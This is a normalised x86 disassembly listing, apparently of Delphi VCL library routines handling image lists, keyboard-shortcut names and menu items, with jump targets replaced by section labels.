mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4223a4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412484
mov eax [ ebp - 0x4 ]
call sub_443478
xor eax eax
push ebp
push sub_443096
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44309d
mov eax [ ebp - 0xc ]
call sub_403128
mov eax [ ebp - 0x14 ]
call sub_403128
mov eax [ ebp - 0x4 ]
call sub_44347c
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4124ac
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_421634
push eax
mov eax [ ebp - 0xc ]
call sub_421634
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41cfb8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_4124ac
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_421634
push eax
mov eax [ ebp - 0x14 ]
call sub_421634
lea edx [ ebp - 0x30 ]
pop ecx
call sub_41cfb8
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_442074
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4430e0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419d68
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_443140
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_441efc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443147
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub eax 0xffffffec
sub_443147
mov eax [ ebp - 0x4 ]
call sub_441d64
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_443276
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_415530
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_415c38
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415530
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403128
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_415530
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_419d68
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_443259
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_415530
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_441efc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403128
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_415530
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_4432a8
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_441f9c
mov eax edi
call sub_415510
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_415530
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_442e4c
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_4430e0
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_443334
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_419d68
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44342e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bb54
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_441f38
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_441f38
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443435
mov eax [ ebp - 0x4 ]
call sub_403128
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
jmp r-xdata
sub_44349c
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
mov edx esi
call sub_442c0c
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_4434e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44350d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443514
retn
sub_444450
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_43342c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_438c7c
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_4444a8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x3 ] dl
mov [ ebp - 0x2 ] ax
xor eax eax
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov ax [ ebp - 0x2 ]
test [ ebp - 0x3 ] 0x1
je r-xdata
test [ ebp - 0x3 ] 0x4
je r-xdata
add ax 0x2000
test [ ebp - 0x3 ] 0x2
je r-xdata
add ax 0x4000
add ax 0x8000
sub_4444e0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
mov ebx edx
mov [ ebp - 0x2 ] ax
mov eax ebx
call sub_403e78
push 0x0
xor eax eax
mov al [ ebp - 0x2 ]
push eax
call MapVirtualKeyA
shl eax 0x10
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x100
lea edx [ ebp - 0x102 ]
push edx
push eax
call GetKeyNameTextA
mov eax ebx
lea edx [ ebp - 0x102 ]
mov ecx 0x100
call sub_4040e8
sub_444534
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov [ ebp - 0x2 ] ax
xor eax eax
push ebp
push sub_44471d
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl [ ebp - 0x2 ]
xor eax eax
mov al bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f10
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x41
add edx 0x41
call sub_404060
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x8 ]
add bl 0xd
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f10
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f10
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x60
add edx 0x30
call sub_404060
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x8 ]
xor edx edx
mov dl bl
sub edx 0x30
add edx 0x30
call sub_404060
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_403e78
mov eax esi
call sub_403e78
test [ ebp - 0x1 ] 0x20
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ rw-data ]
call sub_403f10
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
xor eax eax
mov al bl
sub eax 0x6f
lea edx [ ebp - 0xc ]
call sub_407d8c
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404184
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov ax [ ebp - 0x2 ]
call sub_4444e0
test [ ebp - 0x1 ] 0x40
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404140
lea eax [ ebp - 0x8 ]
add bl 0x4
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_403f10
jmp r-xdata
jmp r-xdata
test [ ebp - 0x1 ] 0x80
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404140
mov eax esi
mov edx [ ebp - 0x8 ]
call sub_404140
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404140
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444724
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403e9c
retn
sub_444738
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ esi ]
call sub_404138
push eax
mov eax edi
call sub_404138
pop edx
cmp edx eax
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_404138
push eax
mov eax edi
call sub_404338
push eax
mov eax [ esi ]
call sub_404338
pop edx
pop ecx
call sub_407c6c
test eax eax
jne r-xdata
mov bl 0x1
mov eax edi
call sub_404138
mov ecx eax
mov eax esi
mov edx 0x1
call sub_4043d8
sub_444794
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404328
xor eax eax
push ebp
push sub_44486f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
xor esi esi
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_444738
test al al
je r-xdata
or si 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_444738
test al al
je r-xdata
or si 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_444738
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_444738
test al al
je r-xdata
or si 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or si 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444876
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403e9c
retn
mov bx 0x8
inc ebx
cmp bx 0x256
jne r-xdata
mov edi esi
or di bx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_444534
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407c1c
test eax eax
jne r-xdata
sub_4448ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_446e4c
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_446e5c
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x3f ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_44490c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_446e4c
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_446e4c
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_446e5c
mov al [ eax + 0x3f ]
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_446e5c
mov al [ eax + 0x3f ]
mov [ ebp - 0x15 ] al
mov al [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_4448ac
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_4448ac
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_446e5c
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_446e5c
mov al [ eax + 0x3f ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_444a58
push ebx
mov ebx eax
mov eax ebx
call sub_441148
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_449968
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_444a90
push ebx
mov ebx eax
mov eax ebx
call sub_44115c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x38 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444ac0
push ebx
mov ebx eax
mov eax ebx
call sub_441170
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x39 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444af0
push ebx
mov ebx eax
mov eax ebx
call sub_441198
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x54 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444b20
push ebx
mov ebx eax
mov eax ebx
call sub_4411c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x58 ]
call sub_404284
je r-xdata
mov al 0x1
pop ebx
retn
sub_444b54
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x3d ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_441184
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3f ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_444b90
push ebx
mov ebx eax
mov eax ebx
call sub_4411d4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444bc4
push ebx
mov ebx eax
mov eax ebx
call sub_4411e8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov ax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x60 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444bf8
push ebx
mov ebx eax
mov eax ebx
call sub_4411fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3e ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444c2c
push ebx
mov ebx eax
mov eax ebx
call sub_419b60
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_444c54
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_444c74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_446cb4
sub_444c94
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_446d24
sub_444cb4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_446d78
sub_444cd4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x54 ] esi
sub_444cf0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x58
mov edx esi
call sub_403ecc
sub_444d14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_446ea4
sub_444d34
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_446e80
sub_444d54
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_446e94
sub_444d74
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_444da0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419270
mov [ ebx + 0x3e ] 0x1
mov [ ebx + 0x39 ] 0x1
mov [ ebx + 0x3b ] 0x2
mov [ ebx + 0x3c ] 0x2
call sub_44488c
mov [ ebx + 0x50 ] ax
mov [ ebx + 0x40 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov esi eax
mov [ ebx + 0x78 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_4477b0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_444e1c
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_44974c
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
mov eax esi
call sub_446e4c
test eax eax
jg r-xdata
mov edx esi
call sub_4471e4
xor eax eax
mov [ esi + 0x64 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_446e5c
call sub_403128
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov eax [ esi + 0x5c ]
call sub_403128
lea eax [ esi + 0x44 ]
call sub_40cc70
lea eax [ esi + 0x78 ]
call sub_40cc70
mov ax [ esi + 0x50 ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_445238
mov eax [ esi + 0x34 ]
push eax
call DestroyMenu
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_413d8c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192bc
test bl bl
jle r-xdata
call sub_403128
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_444ed0
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44512b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x3e ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445132
lea eax [ ebp - 0x40 ]
call sub_403e78
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x30 ]
call sub_403f10
mov eax ebx
call sub_446e4c
test eax eax
jle r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
mov eax ebx
call sub_4453e0
mov [ ebp - 0x25 ] eax
jmp r-xdata
call GetVersion
and eax 0xff
cmp ax 0x4
jb r-xdata
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404284
sete al
and eax 0x7f
mov esi [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x48 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x38 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x39 ]
or eax [ edx * 4 + rw-data ]
or esi eax
or esi 0x400
mov eax ebx
call sub_446e4c
test eax eax
jle r-xdata
mov [ ebp - 0x39 ] 0x2c
mov [ ebp - 0x35 ] 0x3f
mov eax ebx
call sub_447408
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea edx [ ebp - 0x40 ]
mov ax [ ebx + 0x60 ]
call sub_444534
push [ ebp - 0x40 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4041f8
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404338
push eax
movzx eax [ ebx + 0x50 ]
push eax
push esi
push 0xffffffff
push edi
call InsertMenuA
mov eax [ ebx + 0x30 ]
call sub_404338
push eax
mov eax ebx
call sub_4453e0
push eax
or esi 0x10
push esi
push 0xffffffff
push edi
call InsertMenuA
jmp r-xdata
cmp [ ebx + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_446a24
test eax eax
jne r-xdata
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x30 ]
mov edx r-xdata
call sub_404284
sete al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x3d ]
mov edx [ edx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x48 ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebp - 0x1 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
